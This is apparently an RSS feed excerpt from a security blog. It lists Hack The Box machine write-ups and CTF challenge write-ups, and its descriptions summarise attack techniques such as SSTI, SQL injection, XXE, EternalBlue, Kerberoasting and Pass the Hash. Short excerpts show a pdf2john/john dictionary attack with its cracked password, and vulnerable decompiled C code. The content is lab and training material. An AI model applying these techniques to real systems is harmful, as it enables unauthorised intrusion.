Knowledge about Node.js templates and Perl are needed to compromise this machine</description></item><item><title>Explore</title><link>https://7rocky.github.io/en/htb/explore/</link><pubDate>Sat, 30 Oct 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/explore/</guid><description>Hack The Box. Android. Easy machine. This is a mobile device that uses a vulnerable application that exposes files that provide access via SSH. Some port scanning, port forwarding and Android skills are needed to compromise this device</description></item><item><title>Spider</title><link>https://7rocky.github.io/en/htb/spider/</link><pubDate>Sat, 23 Oct 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/spider/</guid><description>Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Server-Side Template Injection (SSTI) in two fields and SQL injection (SQLi), and an internal website that is vulnerable to XML External Entity (XXE) injection. Advanced knowledge on SSTI and bypassing techniques, SQLi, XXE and port forwarding skills are needed to compromise the machine. This write-up uses a Python script to exploit SSTI and a Bash script to read file using XXE</description></item><item><title>dynstr</title><link>https://7rocky.github.io/en/htb/dynstr/</link><pubDate>Sat, 16 Oct 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/dynstr/</guid><description>Hack The Box. Linux. Medium machine. This machine uses a dynamic DNS service vulnerable to command injection and then the machine has sudo permissions for a command that uses a wildard. DNS knowledge, command injection techniques and wildcard abusing skills are needed to compromise this machine</description></item><item><title>Monitors</title><link>https://7rocky.github.io/en/htb/monitors/</link><pubDate>Sat, 09 Oct 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/monitors/</guid><description>Hack The Box. Linux. Hard machine. This machine has a WordPress web site with a plugin vulnerable to Directory Path Traversal, another website vulnerable to SQL injection, and yet another webpage vulnerable to Insecure Deserialization running inside a Docker container with system capabilities enabled. Deep knowledge about web enumeration, vulnerabilities and exploitation techniques, as well as port forwarding and Docker escaping methods are needed to compromise this machine. This write-up uses a custom Bash script to exploit Insecure Deserialization</description></item><item><title>Cap</title><link>https://7rocky.github.io/en/htb/cap/</link><pubDate>Sat, 02 Oct 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/cap/</guid><description>Hack The Box. Linux. Easy machine. This machine contains Insecure Direct Object Reference (IDOR) and system capabilities. Reading capture files in Wireshark and capabilities enumeration skills are needed to compromise this machine</description></item><item><title>Antique</title><link>https://7rocky.github.io/en/htb/antique/</link><pubDate>Mon, 27 Sep 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/antique/</guid><description>Hack The Box. Linux. Easy machine. This machine is a HP JetDirect printer that exposes its password through SNMP and has an arbritrary file read vulnerability. SNMP enumeration and port forwarding techniques are needed to compromise this machine. This write-up uses a custom Python script to obtain a clear-text password</description></item><item><title>Knife</title><link>https://7rocky.github.io/en/htb/knife/</link><pubDate>Sat, 28 Aug 2021 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/knife/</guid><description>Hack The Box. Linux. Easy machine. This machine contains a webpage built on PHP with a version that has a backdoor and sudo permissions configured. Knowledge of the PHP version and basic privilege escalation skills are needed to compromise this machine</description></item><item><title>Rope</title><link>https://7rocky.github.io/en/htb/rope/</link><pubDate>Sat, 23 May 2020 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/rope/</guid><description>Hack The Box. Linux. Insane machine. This machine exposes a custom web server that is vulnerable to Directory Path Traversal so we can read files and discover that it is a binary file. After ananlyzing the binary, we discover that it has a Format String vulnerability that can be exploited to get RCE as &lt;code>john&lt;/code>. This user is able to run another binary as user &lt;code>r4j&lt;/code>. This binary uses an external library that we can modify because of its permissions and gain access as &lt;code>r4j&lt;/code>. Finally, there&amp;rsquo;s another binary that runs a local socket server, we can access the binary and analyze it to find out a Buffer Overflow vulnerability. The binary has all protections set, but it is still exploitable to get RCE as &lt;code>root&lt;/code></description></item><item><title>Forest</title><link>https://7rocky.github.io/en/htb/forest/</link><pubDate>Sat, 21 Mar 2020 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/forest/</guid><description>Hack The Box. Windows. Easy machine. This machine presents an Active Directory (AD) environment to perform MS RPC enumeration, AS-REP Roasting, password decrypting, DCSync and Pass the Hash. Basic AD enumeration and exploitation skills, as well as BloodHound knowledge, are needed to compromise this machine</description></item><item><title>Netmon</title><link>https://7rocky.github.io/en/htb/netmon/</link><pubDate>Sat, 29 Jun 2019 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/netmon/</guid><description>Hack The Box. Windows. Easy machine. This machine presents an instance of PRTG Network Monitor which is vulnerable to RCE as system. We can connect to FTP with anonymous credentials and read the backup for a configuration file for PRTG Network Monitor and get an old password, which provides a format to guess the current password. Then we can run the public exploit to get RCE and become Administrator</description></item><item><title>Frolic</title><link>https://7rocky.github.io/en/htb/frolic/</link><pubDate>Sat, 23 Mar 2019 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/frolic/</guid><description>Hack The Box. Linux. Easy machine. This machine has a website that stores some files with different encodings and esoteric languages. In the end, we reach to a PlaySMS instance that is vulnerable to RCE using PHP. The machine has a SUID binary that is vulnerable to Buffer Overflow and leads to privilege escalation</description></item><item><title>Active</title><link>https://7rocky.github.io/en/htb/active/</link><pubDate>Sat, 08 Dec 2018 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/active/</guid><description>Hack The Box. Windows. Easy machine. This machine presents an Active Directory (AD) environment to perform SMB enumeration, password decrypting and Kerberoasting. Basic AD enumeration and exploitation skills are needed to compromise this machine</description></item><item><title>Jerry</title><link>https://7rocky.github.io/en/htb/jerry/</link><pubDate>Sat, 17 Nov 2018 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/jerry/</guid><description>Hack The Box. Windows. Easy machine. This machine exposes a default page with Tomcat. We can access to the manager using default credentials and get Remote Code Execution on the machine as Administrator</description></item><item><title>Mirai</title><link>https://7rocky.github.io/en/htb/mirai/</link><pubDate>Sat, 10 Feb 2018 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/mirai/</guid><description>Hack The Box. Linux. Easy machine. This machine is a Raspberry Pi device that is configured with default credentials, so we can access through SSH and become root because we belong to group sudo. To get the root.txt flag, we need to do a raw copy of a USB stick</description></item><item><title>Blue</title><link>https://7rocky.github.io/en/htb/blue/</link><pubDate>Sat, 13 Jan 2018 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/blue/</guid><description>Hack The Box. Windows. Easy machine. This machine exposes SMB version 1, which is vulnerable to EternalBlue. Once the exploit is done, we get access as Administrator</description></item><item><title>Lame</title><link>https://7rocky.github.io/en/htb/lame/</link><pubDate>Sun, 18 Jun 2017 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/lame/</guid><description>Hack The Box. Linux. Easy machine. This machine exposes vulnerable versions for FTP and SMB services. The SMB service is exploitable and derives in RCE as root</description></item><item><title>0ld is g0ld</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/0ld-is-g0ld/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/0ld-is-g0ld/</guid><description>We are given a PDF file called 0ld is g0ld.pdf, but it is protected with a password.
In order to obtain the password, we can use pdf2john to extract a hash and pass it to john to perform a dictionary attack using rockyou.txt:
$ pdf2john 0ld\ is\ g0ld.pdf | tee hash 0ld is g0ld.pdf:$pdf$4*4*128*-1060*1*16*5c8f37d2a45eb64e9dbbf71ca3e86861*32*9cba5cfb1c536f1384bba7458aae3f8100000000000000000000000000000000*32*702cc7ced92b595274b7918dcb6dc74bedef6ef851b4b4b5b8c88732ba4dac0c $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64]) Cost 1 (revision) is 4 for all loaded hashes Press 'q' or Ctrl-C to abort, almost any other key for status jumanji69 (0ld is g0ld.</description></item><item><title>0xBOverchunked</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/0xboverchunked/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/0xboverchunked/</guid><description>We are given this webpage:
This webpage allows us to search some games by ID:
Source code analysis We are also given the PHP source code of the server. According to db/init.sql, we must read the contents of ID 6 to get the flag, but we can&amp;rsquo;t do that directly:
CREATE TABLE posts ( id INTEGER PRIMARY KEY, gamename TEXT NOT NULL, gamedesc TEXT NOT NULL, image BLOB NOT NULL ); INSERT INTO posts (gamename, gamedesc, image) VALUES ('Pikachu', 'A small, yellow, mouse-like creature with a lightning bolt-shaped tail.</description></item><item><title>400curves</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/400curves/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/400curves/</guid><description>We are provided with the server source code in Python:
from Crypto.Util.number import inverse, bytes_to_long import socketserver import signal from secret import FLAG a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff E = {'a': a, 'b': b, 'p': p} class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def recieveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def add(P, Q, E): if (P == (0, 0)): return Q elif (Q == (0, 0)): return P else: Ea, Ep = E['a'], E['p'] x1, y1 = P x2, y2 = Q if ((x1 == x2) &amp;amp; (y1 == -y2)): return ((0, 0)) else: if (P !</description></item><item><title>5x5 Crypto</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/5x5-crypto/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/5x5-crypto/</guid><description>We are given this set of numbers and characters:
1-3,4-4,2-1,3-1,1-5,1-1,4-2,3-3,{,4-4,2-3,4-5,3-2,1-2,4-3,_,4-5,3-5,} And we are told that the encryption method takes a 5x5 grid with all letters of the alphabet in order. If we do a quick search, we will find Polybius Square, which is this one:
A B C D E F G H I/J K L M N O P Q R S T U V W X Y Z We can take every pair of i-j and match it to a letter finding the corresponding row-column cell.</description></item><item><title>A little something to get you started</title><link>https://7rocky.github.io/en/ctf/hacker101ctf/a-little-something-to-get-you-started/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/hacker101ctf/a-little-something-to-get-you-started/</guid><description>We have a simple website like this one:
We can read the HTML source code of the website, which is:
There is an image called background.png, but we did not observe any image on the website. We can try to access it using curl:
$ curl http://35.190.155.168/9a968e7787/background.png ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$ And we have the flag.</description></item><item><title>A Puzzle in Seven Parts</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/a-puzzle-in-seven-parts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/a-puzzle-in-seven-parts/</guid><description>We are given this string:
AbCDeFGAbCDEFGAbCDEFGABCdEFGaBCdeFGAbCDEFGAbCDEFGaBCdefgAbCDeFGABCdeFGAbCDeFGABCdefgaBCdeFGAbCDeFGABCdefgABCDEFGAbCDeFGAbCDeFGAbCDeFGABCDEFGAbCDEFGaBCdeFGaBCdeFGAbcDEFGAbCDeFGAbCDEFGAbCDeFGABCdefgAbCDeFGABcDEfGABCdefgaBCdefgAbCDeFGAbCDeFGABCDefGABCDEFgAbCDeFGABCdEFGAbCDEFGaBCdefgAbCDEFGABCDefGAbCDEFGAbcDEFgAbCDeFGAbCDeFGABCdefgABCdefgAbCDEFGaBCdefgaBCdeFGAbCDeFGaBCdeFGAbcDEFGAbCDEFGABCdEFGAbCDeFGABcDEfGAbCDEFGAbcDEFgaBCdeFGABCdEFGAbCDeFGAbCDEFGAbCDeFGAbCDeFGAbCDeFGABCdefgABCDefGAbCDeFGAbCDEFGabCDEFGAbCDeFGaBCdeFGABCDefGaBCdefgAbCDeFGABCdEFGABCdefgAbCDeFGAbCDeFGaBCdefgAbCDEFGAbcDEFgAbCDEFGABCDEFGAbCDeFGABCdefgaBCdeFGaBCDEfGAbCDeFGAbCDEFGaBCdeFGABCdEFGAbCDeFGABCDEFGAbCDeFGABCdeFGAbCDeFGaBCdeFGaBCdeFGAbCDEFGaBCdeFGABCdEFGAbCDEFGaBCdeFGABCDefGABcDEfGaBCdeFGABCdEFGaBCdeFGAbCDeFGAbCDeFGABCdefgAbCDEFGAbcDEFgAbCDEFGaBCdeFGAbCDeFGABCDefGaBCdeFGaBCDEfGABCDefGABCDEFgaBCdeFGABCdEFGaBCdeFGAbCDeFGAbCDeFGAbCDEFGAbCDEFGABCdEFGaBCdeFGAbCDEFGAbCDeFGAbCDEFGAbCDEFGAbCDeFGaBCdeFGABCdefgaBCdeFGAbcDEFGAbCDeFGABCDEFGAbCDeFGABCDefGAbCDEFGabCDEFGAbCDEFGAbcDEFgAbCDeFGAbCDEFGAbCDEFGABcDEfGaBCdeFGABCdefgAbCDEFGABCDEFGAbCDeFGaBCdeFGAbCDeFGAbCDeFGAbCDEFGAbcDEFgAbCDeFGABcDEfGAbCDeFGABCdefgAbCDeFGAbCDEFGAbCDeFGAbCDEFGAbCDEFGaBCdeFGAbCDeFGABCDEFGAbCDEFGABCDefGaBCdeFGAbCDeFGAbCDEFGaBCdeFGAbCDEFGabCDEFGaBCdeFGaBCDEfGAbCDeFGAbCDEFGAbCDEFGAbcDEFgABCDefGABCDefGAbCDeFGaBCdeFGABCDefGaBCdefgAbCDeFGABCdEFGABCdefgABCDefGAbCDeFGABCdeFGAbCDeFGAbCDEFGaBCdeFGABCdEFGABCdefgAbCDeFGAbCDeFGaBCdefgAbCDEFGAbcDEFgAbCDEFGAbcDEFgAbCDeFGAbCDEFGAbCDEFGABcDEfGaBCdeFGABCdefgaBCdeFGaBCDEfGABCDefGaBCdefgAbCDeFGaBCdeFGAbCDeFGaBCdeFGaBCdeFGAbCDEFGAbCDEFGabCDEFGAbCDeFGABCdefgAbCDeFGABCdefgaBCdeFGAbcDEFGaBCdeFGAbCDEFGAbCDeFGABCdefgAbCDEFGabCDEFGABCDefGABCdeFGAbCDeFGABCdefgaBCdeFGaBCDEfGaBCdeFGAbCDEFGABCdefgABCDEFgaBCdeFGABCdEFGAbCDeFGAbCDEFGAbCDEFGabCDEFGAbCDEFGABCDefGABCDefGaBCdefgAbCDeFGAbCDeFGABCDefGaBCdefgAbCDeFGABCdeFGABCdefgABCdeFGAbCDeFGABCDefGAbCDEFGAbcDEFgAbCDEFGaBCdeFGAbCDEFGABCdEFGAbCDeFGABCDefGaBCdeFGAbCDeFGABCdefgABCDEFgAbCDeFGABCdefgAbCDeFGaBCdeFGAbCDeFGAbCDeFGAbCDeFGABCdEFGAbCDEFGaBCdefgaBCdeFGaBCDEfGABCDefGaBCdefgABCdefgABCDEFgaBCdeFGAbCDeFGAbCDeFGABcDEfGAbCDEFGAbcDEFGAbCDEFGaBCdeFGAbCDeFGaBCdeFGAbCDeFGABcDEfGAbCDeFGaBCdeFGaBCdeFGAbCDEFGAbCDeFGABCdEFGAbCDeFGAbCDEFGaBCdeFGABCdefgABCDefGaBCdefgAbCDEFGAbcdEFGAbCDeFGAbCDeFGABCDefGABCDEFgABCDefGaBCdefgaBCdeFGABCdeFGAbCDeFGaBCdefgAbCDEFGabCDEFGABCdefgaBCdeFGAbCDeFGABCdefgAbCDeFGABcDEfGAbCDEFGAbcDEFgAbCDeFGABCdEFGAbCDeFGABCDefGAbCDeFGABCdEFGaBCdeFGaBCdeFGaBCdeFGAbCDEFGaBCdeFGABCDefGAbCDeFGAbCDeFGAbCDEFGAbcDEFgaBCdeFGABcDEfGAbCDeFGAbCDeFGaBCdeFGaBCDEfGaBCdeFGaBCdeFGABCDefGABCDEFgABCDefGaBCDEfG Seven-segment display As the challenge suggests, the above string must be related to a seven-segment display:
For example, the first 7 letters are AbCDeFG, which form a 5 (uppercase letters are on and lowercase letters are off). Let&amp;rsquo;s use Python to split the whole string in chunks of 7 letters and remove lowercase letters:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; import re &amp;gt;&amp;gt;&amp;gt; m = 'AbCDeFGAbCDEFGAbCDEFGABCdEFGaBCdeFGAbCDEFGAbCDEFGaBCdefgAbCDeFGABCdeFGAbCDeFGABCdefgaBCdeFGAbCDeFGABCdefgABCDEFGAbCDeFGAbCDeFGAbCDeFGABCDEFGAbCDEFGaBCdeFGaBCdeFGAbcDEFGAbCDeFGAbCDEFGAbCDeFGABCdefgAbCDeFGABcDEfGABCdefgaBCdefgAbCDeFGAbCDeFGABCDefGABCDEFgAbCDeFGABCdEFGAbCDEFGaBCdefgAbCDEFGABCDefGAbCDEFGAbcDEFgAbCDeFGAbCDeFGABCdefgABCdefgAbCDEFGaBCdefgaBCdeFGAbCDeFGaBCdeFGAbcDEFGAbCDEFGABCdEFGAbCDeFGABcDEfGAbCDEFGAbcDEFgaBCdeFGABCdEFGAbCDeFGAbCDEFGAbCDeFGAbCDeFGAbCDeFGABCdefgABCDefGAbCDeFGAbCDEFGabCDEFGAbCDeFGaBCdeFGABCDefGaBCdefgAbCDeFGABCdEFGABCdefgAbCDeFGAbCDeFGaBCdefgAbCDEFGAbcDEFgAbCDEFGABCDEFGAbCDeFGABCdefgaBCdeFGaBCDEfGAbCDeFGAbCDEFGaBCdeFGABCdEFGAbCDeFGABCDEFGAbCDeFGABCdeFGAbCDeFGaBCdeFGaBCdeFGAbCDEFGaBCdeFGABCdEFGAbCDEFGaBCdeFGABCDefGABcDEfGaBCdeFGABCdEFGaBCdeFGAbCDeFGAbCDeFGABCdefgAbCDEFGAbcDEFgAbCDEFGaBCdeFGAbCDeFGABCDefGaBCdeFGaBCDEfGABCDefGABCDEFgaBCdeFGABCdEFGaBCdeFGAbCDeFGAbCDeFGAbCDEFGAbCDEFGABCdEFGaBCdeFGAbCDEFGAbCDeFGAbCDEFGAbCDEFGAbCDeFGaBCdeFGABCdefgaBCdeFGAbcDEFGAbCDeFGABCDEFGAbCDeFGABCDefGAbCDEFGabCDEFGAbCDEFGAbcDEFgAbCDeFGAbCDEFGAbCDEFGABcDEfGaBCdeFGABCdefgAbCDEFGABCDEFGAbCDeFGaBCdeFGAbCDeFGAbCDeFGAbCDEFGAbcDEFgAbCDeFGABcDEfGAbCDeFGABCdefgAbCDeFGAbCDEFGAbCDeFGAbCDEFGAbCDEFGaBCdeFGAbCDeFGABCDEFGAbCDEFGABCDefGaBCdeFGAbCDeFGAbCDEFGaBCdeFGAbCDEFGabCDEFGaBCdeFGaBCDEfGAbCDeFGAbCDEFGAbCDEFGAbcDEFgABCDefGABCDefGAbCDeFGaBCdeFGABCDefGaBCdefgAbCDeFGABCdEFGABCdefgABCDefGAbCDeFGABCdeFGAbCDeFGAbCDEFGaBCdeFGABCdEFGABCdefgAbCDeFGAbCDeFGaBCdefgAbCDEFGAbcDEFgAbCDEFGAbcDEFgAbCDeFGAbCDEFGAbCDEFGABcDEfGaBCdeFGABCdefgaBCdeFGaBCDEfGABCDefGaBCdefgAbCDeFGaBCdeFGAbCDeFGaBCdeFGaBCdeFGAbCDEFGAbCDEFGabCDEFGAbCDeFGABCdefgAbCDeFGABCdefgaBCdeFGAbcDEFGaBCdeFGAbCDEFGAbCDeFGABCdefgAbCDEFGabCDEFGABCDefGABCdeFGAbCDeFGABCdefgaBCdeFGaBCDEfGaBCdeFGAbCDEFGABCdefgABCDEFgaBCdeFGABCdEFGAbCDeFGAbCDEFGAbCDEFGabCDEFGAbCDEFGABCDefGABCDefGaBCdefgAbCDeFGAbCDeFGABCDefGaBCdefgAbCDeFGABCdeFGABCdefgABCdeFGAbCDeFGABCDefGAbCDEFGAbcDEFgAbCDEFGaBCdeFGAbCDEFGABCdEFGAbCDeFGABCDefGaBCdeFGAbCDeFGABCdefgABCDEFgAbCDeFGABCdefgAbCDeFGaBCdeFGAbCDeFGAbCDeFGAbCDeFGABCdEFGAbCDEFGaBCdefgaBCdeFGaBCDEfGABCDefGaBCdefgABCdefgABCDEFgaBCdeFGAbCDeFGAbCDeFGABcDEfGAbCDEFGAbcDEFGAbCDEFGaBCdeFGAbCDeFGaBCdeFGAbCDeFGABcDEfGAbCDeFGaBCdeFGaBCdeFGAbCDEFGAbCDeFGABCdEFGAbCDeFGAbCDEFGaBCdeFGABCdefgABCDefGaBCdefgAbCDEFGAbcdEFGAbCDeFGAbCDeFGABCDefGABCDEFgABCDefGaBCdefgaBCdeFGABCdeFGAbCDeFGaBCdefgAbCDEFGabCDEFGABCdefgaBCdeFGAbCDeFGABCdefgAbCDeFGABcDEfGAbCDEFGAbcDEFgAbCDeFGABCdEFGAbCDeFGABCDefGAbCDeFGABCdEFGaBCdeFGaBCdeFGaBCdeFGAbCDEFGaBCdeFGABCDefGAbCDeFGAbCDeFGAbCDEFGAbcDEFgaBCdeFGABcDEfGAbCDeFGAbCDeFGaBCdeFGaBCDEfGaBCdeFGaBCdeFGABCDefGABCDEFgABCDefGaBCDEfG' &amp;gt;&amp;gt;&amp;gt; ms = [m[i : i + 7] for i in range(0, len(m), 7)] &amp;gt;&amp;gt;&amp;gt; ms = [re.</description></item><item><title>A Very Good Place to Start</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/a-very-good-place-to-start/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/a-very-good-place-to-start/</guid><description>We are given a 64-bit binary called start:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Reverse engineering If we use Ghidra to extract the decompiled C source code, we see the main function:
int main() { int ret; char name[64]; FILE *fp; uint i; setbuf(stdout, NULL); setbuf(stdin, NULL); fp = fopen("./flag.txt", "r"); __isoc99_fscanf(fp, "%s", flag); printf("What\'s your name? "); fgets(name, 128, stdin); i = 0; do { if (63 &amp;lt; i) { LAB_00401240: ret = strcmp("</description></item><item><title>AAAA</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/aaaa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/aaaa/</guid><description>We are given this domain: number6challenge.imaginaryctf.org.
DNS enumeration Since the challenge is called &amp;ldquo;AAAA&amp;rdquo;, we can think of the AAAA record in DNS (more information here). To check it, we can use dig:
$ dig number6challenge.imaginaryctf.org AAAA ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.6 &amp;lt;&amp;lt;&amp;gt;&amp;gt; number6challenge.imaginaryctf.org AAAA ;; global options: +cmd ;; Got answer: ;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 14021 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;number6challenge.</description></item><item><title>AbraCryptabra</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/abracryptabra/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/abracryptabra/</guid><description>We are provided with the server source code in Python:
from Crypto.Util.number import long_to_bytes, GCD from Crypto.Util.Padding import pad from Crypto.Cipher import AES import hashlib import random import socketserver import signal from secret import FLAG LOGO = (""" ╭━━━┳╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╭╮ ┃╭━╮┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯╰╮╱╱┃┃ ┃┃╱┃┃╰━┳━┳━━┳━━┳━┳╮╱╭┳━┻╮╭╋━━┫╰━┳━┳━━╮ ┃╰━╯┃╭╮┃╭┫╭╮┃╭━┫╭┫┃╱┃┃╭╮┃┃┃╭╮┃╭╮┃╭┫╭╮┃ ┃╭━╮┃╰╯┃┃┃╭╮┃╰━┫┃┃╰━╯┃╰╯┃╰┫╭╮┃╰╯┃┃┃╭╮┃ ╰╯╱╰┻━━┻╯╰╯╰┻━━┻╯╰━╮╭┫╭━┻━┻╯╰┻━━┻╯╰╯╰╯ ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃┃┃ ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯╰╯\n""") class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def receiveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def bytes_to_bits(input): return ''.</description></item><item><title>AbuseHumanDB</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/abusehumandb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/abusehumandb/</guid><description>We have a website that allows us to enter URL. Then a bot will access it:
Source code analysis On the source code we have an Express JS application. This is the routes/index.js file:
const bot = require('../bot') const path = require('path') const express = require('express') const router = express.Router() const response = data =&amp;gt; ({ message: data }) const isLocalhost = req =&amp;gt; (req.ip == '127.0.0.1' &amp;amp;&amp;amp; req.headers.host == '127.</description></item><item><title>aes</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/aes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/aes/</guid><description>We are given this output:
Python 3.8.10 (default, Mar 15 2022, 12:22:08) [GCC 9.4.0] on linux Type "help", "copyright", "credits" or "license" for more information. &amp;gt;&amp;gt;&amp;gt; import random &amp;gt;&amp;gt;&amp;gt; from Crypto.Cipher import AES &amp;gt;&amp;gt;&amp;gt; key = random.choice(open("rockyou.txt", "rb").readlines()[:10000]).strip() &amp;gt;&amp;gt;&amp;gt; key = key.zfill(16) &amp;gt;&amp;gt;&amp;gt; cipher = AES.new(key, AES.MODE_ECB) &amp;gt;&amp;gt;&amp;gt; cipher.encrypt(open("flag.txt", "rb").read().zfill(48)) b"\xd6\x19O\xbeA\xb0\x15\x87\x0e\xc7\xc4\xc1\xe9h\xd8\xe6\xc6\x95\x82\xaa#\x91\xdb2l\xfa\xf7\xe1C\xb8\x11\x04\x82p\xe5\x9e\xb1\x0c*\xcc[('\x0f\xcc\xa7W\xff" It is an output from Python REPL. It takes a random password from rockyou.txt and uses it as the key to encrypt the flag with AES ECB.</description></item><item><title>AESWCM</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/aeswcm/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/aeswcm/</guid><description>We got the Python source code of the server:
from Crypto.Util.Padding import pad from Crypto.Cipher import AES import os import random from secret import FLAG KEY = os.urandom(16) IV = os.urandom(16) class AESWCM: def __init__(self, key): self.key = key self.cipher = AES.new(self.key, AES.MODE_ECB) self.BLOCK_SIZE = 16 def pad(self, pt): if len(pt) % self.BLOCK_SIZE != 0: pt = pad(pt, self.BLOCK_SIZE) return pt def blockify(self, message): return [ message[i:i + self.BLOCK_SIZE] for i in range(0, len(message), self.</description></item><item><title>AESWCM</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/aeswcm/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/aeswcm/</guid><description>We got the Python source code of the server:
from Crypto.Util.Padding import pad from Crypto.Cipher import AES import os import random from secret import FLAG KEY = os.urandom(16) IV = os.urandom(16) class AESWCM: def __init__(self, key): self.key = key self.cipher = AES.new(self.key, AES.MODE_ECB) self.BLOCK_SIZE = 16 def pad(self, pt): if len(pt) % self.BLOCK_SIZE != 0: pt = pad(pt, self.BLOCK_SIZE) return pt def blockify(self, message): return [ message[i:i + self.BLOCK_SIZE] for i in range(0, len(message), self.</description></item><item><title>AHS512</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/ahs512/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/ahs512/</guid><description>We got the Python source code of the server:
from secret import FLAG from hashlib import sha512 import socketserver import signal from random import randint WELCOME = """ **************** Welcome to the Hash Game. **************** * * * Hash functions are really spooky. * * In this game you will have to face your fears. * * Can you find a colision in the updated sha512? * * * *********************************************************** "</description></item><item><title>AHS512</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/ahs512/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/ahs512/</guid><description>We got the Python source code of the server:
